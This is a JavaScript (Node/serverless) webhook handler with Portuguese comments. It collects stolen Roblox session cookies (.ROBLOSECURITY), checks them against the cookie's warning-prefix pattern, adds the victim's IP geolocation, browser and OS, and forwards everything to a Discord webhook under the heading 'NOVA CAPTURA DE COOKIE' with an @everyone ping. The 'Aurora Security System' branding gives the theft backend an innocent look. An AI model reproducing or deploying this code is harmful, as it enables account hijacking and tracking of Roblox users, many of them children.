/**
 * Webhook API - Recebe e processa dados de cookies
 * SEGURANÇA: Credenciais devem estar em variáveis de ambiente
 */

export default async function handler(req, res) {
  // CORS - Configuração Flexível
  const origin = req.headers.origin;
  const allowedOrigins = (process.env.ALLOWED_ORIGINS || '').split(',').map(o => o.trim().replace(/\/$/, ''));
  
  if (allowedOrigins.includes(origin)) {
    res.setHeader('Access-Control-Allow-Origin', origin);
  } else if (!process.env.ALLOWED_ORIGINS) {
    res.setHeader('Access-Control-Allow-Origin', '*');
  }

  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type, X-Requested-With');
  res.setHeader('X-Content-Type-Options', 'nosniff');
  res.setHeader('X-Frame-Options', 'DENY');

  if (req.method === 'OPTIONS') {
    return res.status(200).end();
  }

  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Método não permitido' });
  }

  try {
    let { cookie, ip, device, userAgent } = req.body;

    // Tentar obter IP real se o enviado for inválido ou ausente
    const forwarded = req.headers['x-forwarded-for'];
    const realIp = forwarded ? forwarded.split(',')[0] : req.socket.remoteAddress;
    
    if (!ip || ip === 'Não disponível') {
      ip = realIp;
    }

    // ===== VALIDAÇÃO =====
    if (!cookie || typeof cookie !== 'string') {
      return res.status(400).json({ error: 'Cookie inválido' });
    }

    const trimmedCookie = cookie.trim();

    if (trimmedCookie.length < 50) {
      return res.status(400).json({ error: 'Cookie muito curto' });
    }

    const hasValidPattern = /^_\|WARNING:/.test(trimmedCookie) || /ROBLOSECURITY/.test(trimmedCookie);
    if (!hasValidPattern) {
      return res.status(400).json({ error: 'Formato de cookie inválido' });
    }

    // Validação de IP mais permissiva (Suporta IPv4 e IPv6)
    if (!ip || ip.length < 7) {
      ip = realIp || '0.0.0.0';
    }

    // ===== OBTER WEBHOOK URL DO AMBIENTE =====
    const WEBHOOK_URL = process.env.DISCORD_WEBHOOK_URL;
    if (!WEBHOOK_URL) {
      console.error('ERRO: DISCORD_WEBHOOK_URL não configurada');
      return res.status(500).json({ error: 'Erro de configuração do servidor' });
    }

    // ===== VERIFICAR IP BANIDO =====
    const isBanned = await checkIfIPBanned(ip);
    if (isBanned) {
      return res.status(403).json({ error: 'Este IP foi banido do sistema' });
    }

    // ===== PREPARAR DADOS =====
    const timestamp = new Date().toISOString();
    const sessionId = generateSessionId();

    // ===== DIVIDIR COOKIE GRANDE =====
    const cookieParts = splitCookie(trimmedCookie);

    // ===== CONSTRUIR EMBEDS =====
    const embeds = [];
    const fields = [];

    // Adicionar partes do cookie
    if (cookieParts.length === 1) {
      fields.push({
        name: '🍪 COOKIE COMPLETO',
        value: '```' + cookieParts[0] + '```',
        inline: false
      });
    } else {
      cookieParts.forEach((part, index) => {
        fields.push({
          name: index === 0 ? `⚠️ COOKIE - PARTE 1/${cookieParts.length}` : `📦 PARTE ${index + 1}/${cookieParts.length}`,
          value: '```' + part + '```',
          inline: false
        });
      });
    }

    // Informações do dispositivo
    fields.push({
      name: '📊 DISPOSITIVO',
      value: `\`\`\`yml
Tipo: ${sanitizeString(device || 'Desconhecido')}
Navegador: ${getBrowserInfo(userAgent)}
Sistema: ${getOSInfo(userAgent)}
\`\`\``,
      inline: false
    });

    // Informações do IP
    let ipInfo = {};
    try {
      const controller = new AbortController();
      const timeoutId = setTimeout(() => controller.abort(), 5000);
      const ipResponse = await fetch(`http://ip-api.com/json/${ip}?fields=66846719`, {
        signal: controller.signal
      });
      clearTimeout(timeoutId);
      if (ipResponse.ok) {
        ipInfo = await ipResponse.json();
      }
    } catch (e) {
      console.error('Erro ao buscar info do IP:', e.message);
    }

    fields.push({
      name: '🌍 IP',
      value: `\`\`\`yml
IP: ${ip}
País: ${ipInfo.country || 'Desconhecido'} ${ipInfo.countryCode || ''}
Região: ${ipInfo.regionName || 'Desconhecido'}
Cidade: ${ipInfo.city || 'Desconhecido'}
ISP: ${ipInfo.isp || 'Desconhecido'}
\`\`\``,
      inline: false
    });

    // Informações adicionais
    fields.push({
      name: '⏰ TIMESTAMP',
      value: `<t:${Math.floor(Date.now() / 1000)}:F>`,
      inline: true
    });

    fields.push({
      name: '🔢 ID DA SESSÃO',
      value: `\`${sessionId}\``,
      inline: true
    });

    // ===== CRIAR EMBEDS (máximo 10 campos por embed) =====
    const MAX_FIELDS_PER_EMBED = 10;
    for (let i = 0; i < fields.length; i += MAX_FIELDS_PER_EMBED) {
      const embedFields = fields.slice(i, i + MAX_FIELDS_PER_EMBED);

      embeds.push({
        title: i === 0 ? '🔐 NOVA CAPTURA DE COOKIE' : `📎 CONTINUAÇÃO (${Math.floor(i / MAX_FIELDS_PER_EMBED) + 1})`,
        description: i === 0 ? 'Um novo cookie foi capturado pelo sistema Aurora' : 'Continuação das informações',
        color: 0x6366f1,
        fields: embedFields,
        footer: {
          text: 'Aurora Security System • Proteção Avançada'
        },
        timestamp: timestamp
      });
    }

    // ===== ENVIAR PARA O DISCORD =====
    let allSuccess = true;

    for (let i = 0; i < embeds.length; i++) {
      const payload = {
        content: i === 0 ? '@everyone 🚨 NOVA CAPTURA!' : null,
        embeds: [embeds[i]],
        allowed_mentions: { parse: ['everyone'] }
      };

      try {
        const response = await fetch(WEBHOOK_URL, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(payload)
        });

        if (!response.ok) {
          allSuccess = false;
          console.error(`Erro ao enviar embed ${i + 1}:`, response.status);
        }

        // Pequeno delay entre embeds
        if (embeds.length > 1 && i < embeds.length - 1) {
          await new Promise(resolve => setTimeout(resolve, 500));
        }
      } catch (error) {
        allSuccess = false;
        console.error(`Erro ao enviar embed ${i + 1}:`, error);
      }
    }

    if (!allSuccess) {
      return res.status(500).json({ error: 'Falha ao processar solicitação' });
    }

    return res.status(200).json({
      success: true,
      message: 'Dados processados com sucesso',
      sessionId: sessionId
    });

  } catch (error) {
    console.error('Erro interno:', error);
    return res.status(500).json({ error: 'Erro interno do servidor' });
  }
}

// ===== FUNÇÕES AUXILIARES =====

/**
 * Verifica se o IP está banido
 */
async function checkIfIPBanned(ip) {
  try {
    const response = await fetch(`${process.env.API_BASE_URL || ''}/api/verificar-ban?ip=${encodeURIComponent(ip)}`);
    if (response.ok) {
      const data = await response.json();
      return data.banned === true;
    }
  } catch (error) {
    console.error('Erro ao verificar ban:', error);
  }
  return false;
}

/**
 * Divide cookie grande em partes
 */
function splitCookie(cookieStr) {
  const MAX_FIELD_SIZE = 1900;

  if (cookieStr.length <= MAX_FIELD_SIZE) {
    return [cookieStr];
  }

  const parts = [];
  let remaining = cookieStr;

  while (remaining.length > MAX_FIELD_SIZE) {
    let splitIndex = remaining.lastIndexOf(':', MAX_FIELD_SIZE);
    if (splitIndex === -1) splitIndex = remaining.lastIndexOf('-', MAX_FIELD_SIZE);
    if (splitIndex === -1) splitIndex = remaining.lastIndexOf('=', MAX_FIELD_SIZE);
    if (splitIndex === -1) splitIndex = MAX_FIELD_SIZE;

    parts.push(remaining.substring(0, splitIndex));
    remaining = remaining.substring(splitIndex);
  }
  parts.push(remaining);

  return parts;
}

/**
 * Obtém informações do navegador
 */
function getBrowserInfo(ua) {
  if (!ua) return 'Desconhecido';
  ua = ua.toLowerCase();
  if (ua.includes('chrome') && !ua.includes('edg')) return 'Google Chrome';
  if (ua.includes('firefox')) return 'Mozilla Firefox';
  if (ua.includes('safari') && !ua.includes('chrome')) return 'Apple Safari';
  if (ua.includes('edg')) return 'Microsoft Edge';
  if (ua.includes('opera') || ua.includes('opr')) return 'Opera';
  if (ua.includes('brave')) return 'Brave';
  return 'Desconhecido';
}

/**
 * Obtém informações do SO
 */
function getOSInfo(ua) {
  if (!ua) return 'Desconhecido';
  ua = ua.toLowerCase();
  if (ua.includes('windows')) return 'Windows';
  if (ua.includes('mac os') || ua.includes('macintosh')) return 'macOS';
  if (ua.includes('linux')) return 'Linux';
  if (ua.includes('android')) return 'Android';
  if (ua.includes('ios') || ua.includes('iphone') || ua.includes('ipad')) return 'iOS';
  return 'Desconhecido';
}

/**
 * Gera ID de sessão único
 */
function generateSessionId() {
  return Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 15);
}

/**
 * Sanitiza strings para evitar XSS
 */
function sanitizeString(str) {
  if (typeof str !== 'string') return '';
  return str
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#x27;');
}
